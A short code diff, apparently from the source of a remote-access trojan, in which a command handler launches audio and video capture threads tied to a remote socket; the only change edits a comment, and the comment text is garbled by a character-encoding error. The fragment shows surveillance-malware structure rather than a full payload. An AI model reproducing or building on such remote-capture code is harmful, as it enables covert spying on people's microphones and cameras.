@@ -68,7 +68,7 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
-	case COMMAND_AUDIO:				// ÉãÏñÍ·
+	case COMMAND_AUDIO:				// Â¼Òô»ú
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
